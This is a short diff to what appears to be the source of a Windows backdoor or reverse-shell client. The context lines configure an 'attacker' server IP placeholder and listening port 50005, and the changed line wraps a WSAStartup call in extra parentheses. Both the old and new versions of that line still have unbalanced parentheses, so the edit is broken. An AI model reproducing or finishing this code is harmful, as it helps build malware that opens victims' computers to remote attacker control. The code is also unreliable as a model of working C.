@@ -61,7 +61,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServIP = "INSERT SERVER IP ADDRESS"; // IP address from attacker (ifconfig - inet)
 	ServPort = 50005;					 // Listening port
 
-	if (WSAStartup(MAKEWORD(2, 0), &wsaData)) != 0)
+	if ((WSAStartup(MAKEWORD(2, 0), &wsaData))) != 0)
 		{
 			exit(1);
 		}
